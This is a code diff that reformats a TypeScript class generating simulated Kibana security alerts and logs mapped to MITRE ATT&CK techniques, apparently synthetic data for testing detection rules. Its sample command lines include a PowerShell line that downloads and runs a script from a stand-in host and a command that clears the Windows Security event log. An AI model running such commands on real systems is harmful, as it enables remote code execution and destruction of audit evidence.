@@ -319,12 +319,15 @@ export class RealisticAttackEngine {
     };
 
     // Create a complete Kibana alert using the standard structure
-    const baseAlert = createAlerts({}, {
-      userName,
-      hostName,
-      space: config.space,
-      timestampConfig: alertTimestampConfig,
-    });
+    const baseAlert = createAlerts(
+      {},
+      {
+        userName,
+        hostName,
+        space: config.space,
+        timestampConfig: alertTimestampConfig,
+      },
+    );
 
     // Override with campaign-specific alert data
     const alert = {
@@ -334,48 +337,57 @@ export class RealisticAttackEngine {
       'kibana.alert.start': alertTime.toISOString(),
       'kibana.alert.last_detected': alertTime.toISOString(),
       'kibana.alert.original_time': alertTime.toISOString(),
-      
+
       // Override rule information
       'kibana.alert.rule.name': this.generateRuleName(triggerLog, technique),
       'kibana.alert.reason': `Suspicious activity detected on ${hostName}`,
       'kibana.alert.severity': this.determineSeverity(triggerLog, technique),
       'kibana.alert.risk_score': faker.number.int({ min: 40, max: 100 }),
       'kibana.alert.rule.risk_score': faker.number.int({ min: 40, max: 100 }),
-      'kibana.alert.rule.severity': this.determineSeverity(triggerLog, technique),
-      
+      'kibana.alert.rule.severity': this.determineSeverity(
+        triggerLog,
+        technique,
+      ),
+
       // Add MITRE ATT&CK information
       'threat.technique.id': technique,
       'threat.technique.name': this.getTechniqueName(technique),
       'event.category': ['intrusion_detection'],
-      
+
       // Update rule parameters with technique-specific info
       'kibana.alert.rule.parameters': {
         ...baseAlert['kibana.alert.rule.parameters'],
         description: this.generateRuleDescription(triggerLog, technique),
         risk_score: faker.number.int({ min: 40, max: 100 }),
         severity: this.determineSeverity(triggerLog, technique),
-        threat: [{
-          framework: 'MITRE ATT&CK',
-          technique: [{
-            id: technique,
-            name: this.getTechniqueName(technique),
-            reference: `https://attack.mitre.org/techniques/${technique}/`
-          }]
-        }],
+        threat: [
+          {
+            framework: 'MITRE ATT&CK',
+            technique: [
+              {
+                id: technique,
+                name: this.getTechniqueName(technique),
+                reference: `https://attack.mitre.org/techniques/${technique}/`,
+              },
+            ],
+          },
+        ],
         query: this.generateDetectionQuery(triggerLog, technique),
         index: [triggerLog['data_stream.dataset'] || 'logs-*'],
       },
-      
+
       // Link back to the source log
       'kibana.alert.ancestors': [
         {
           id: faker.string.alphanumeric(16),
           type: 'event',
-          index: triggerLog._index || `logs-${triggerLog['data_stream.dataset']}-default`,
+          index:
+            triggerLog._index ||
+            `logs-${triggerLog['data_stream.dataset']}-default`,
           depth: 0,
         },
       ],
-      
+
       // Add source log metadata for correlation
       _source_log: {
         index: triggerLog._index || 'logs-unknown',
@@ -446,18 +458,29 @@ export class RealisticAttackEngine {
    */
   private generateRuleDescription(log: any, technique: string): string {
     const descriptions: Record<string, string> = {
-      T1566: 'Detects malicious email attachments and phishing attempts based on file patterns and network behavior.',
-      T1059: 'Identifies suspicious command-line activity including PowerShell, CMD, and scripting interpreter usage.',
-      T1055: 'Detects process injection techniques including DLL injection and code injection patterns.',
-      T1003: 'Monitors for credential dumping activities including LSASS access and hash extraction.',
-      T1070: 'Identifies attempts to remove indicators of compromise from systems.',
-      T1083: 'Detects file and directory discovery activities that may indicate reconnaissance.',
-      T1190: 'Monitors for exploitation attempts against public-facing applications.',
+      T1566:
+        'Detects malicious email attachments and phishing attempts based on file patterns and network behavior.',
+      T1059:
+        'Identifies suspicious command-line activity including PowerShell, CMD, and scripting interpreter usage.',
+      T1055:
+        'Detects process injection techniques including DLL injection and code injection patterns.',
+      T1003:
+        'Monitors for credential dumping activities including LSASS access and hash extraction.',
+      T1070:
+        'Identifies attempts to remove indicators of compromise from systems.',
+      T1083:
+        'Detects file and directory discovery activities that may indicate reconnaissance.',
+      T1190:
+        'Monitors for exploitation attempts against public-facing applications.',
       T1195: 'Detects potential supply chain compromise indicators.',
-      T1486: 'Identifies ransomware encryption activities and related file system changes.',
+      T1486:
+        'Identifies ransomware encryption activities and related file system changes.',
       T1041: 'Detects data exfiltration over command and control channels.',
     };
-    return descriptions[technique] || `Detects suspicious activity related to ${technique}`;
+    return (
+      descriptions[technique] ||
+      `Detects suspicious activity related to ${technique}`
+    );
   }
 
   /**
@@ -473,12 +496,16 @@ export class RealisticAttackEngine {
     multiFieldConfig?: any;
   }): Promise<any[]> {
     const logs: any[] = [];
-    const { hostName, userName, technique, startTime, endTime, logCount } = params;
-    
+    const { hostName, userName, technique, startTime, endTime, logCount } =
+      params;
+
     // Generate basic logs for the technique
     for (let i = 0; i < logCount; i++) {
-      const timestamp = new Date(startTime.getTime() + (i * ((endTime.getTime() - startTime.getTime()) / logCount)));
-      
+      const timestamp = new Date(
+        startTime.getTime() +
+          i * ((endTime.getTime() - startTime.getTime()) / logCount),
+      );
+
       const log = {
         '@timestamp': timestamp.toISOString(),
         'host.name': hostName,
@@ -489,15 +516,15 @@ export class RealisticAttackEngine {
         'event.dataset': 'security',
         'data_stream.dataset': 'logs-endpoint.events.process-default',
         'threat.technique.id': technique,
-        'message': `Simulated activity for ${technique}`,
+        message: `Simulated activity for ${technique}`,
         'process.name': this.getTechniqueProcess(technique),
         'process.pid': faker.number.int({ min: 1000, max: 9999 }),
         'process.command_line': this.getTechniqueCommandLine(technique),
       };
-      
+
       logs.push(log);
     }
-    
+
     return logs;
   }
 
@@ -545,7 +572,8 @@ export class RealisticAttackEngine {
   private getTechniqueCommandLine(technique: string): string {
     const commands: Record<string, string> = {
       T1566: 'outlook.exe /safe',
-      T1059: 'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/script.ps1\')"',
+      T1059:
+        'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/script.ps1\')"',
       T1055: 'svchost.exe -k netsvcs',
       T1003: 'lsass.exe',
       T1070: 'wevtutil.exe clear-log Security',
@@ -564,7 +592,7 @@ export class RealisticAttackEngine {
   private generateDetectionQuery(log: any, technique: string): string {
     const dataset = log['data_stream.dataset'] || 'logs-*';
     const action = log['event.action'] || 'suspicious_activity';
-    
+
     const queryTemplates: Record<string, string> = {
       T1566: `data_stream.dataset:${dataset} AND (event.action:email-* OR file.extension:exe OR file.extension:pdf)`,
       T1059: `data_stream.dataset:${dataset} AND (process.name:powershell.exe OR process.name:cmd.exe OR event.action:script-*)`,
@@ -573,8 +601,11 @@ export class RealisticAttackEngine {
       T1070: `data_stream.dataset:${dataset} AND (event.action:deletion OR file.name:*.log)`,
       T1083: `data_stream.dataset:${dataset} AND (event.action:file-discovery OR api.name:*Find*)`,
     };
-    
-    return queryTemplates[technique] || `data_stream.dataset:${dataset} AND event.action:${action}`;
+
+    return (
+      queryTemplates[technique] ||
+      `data_stream.dataset:${dataset} AND event.action:${action}`
+    );
   }
 
   /**
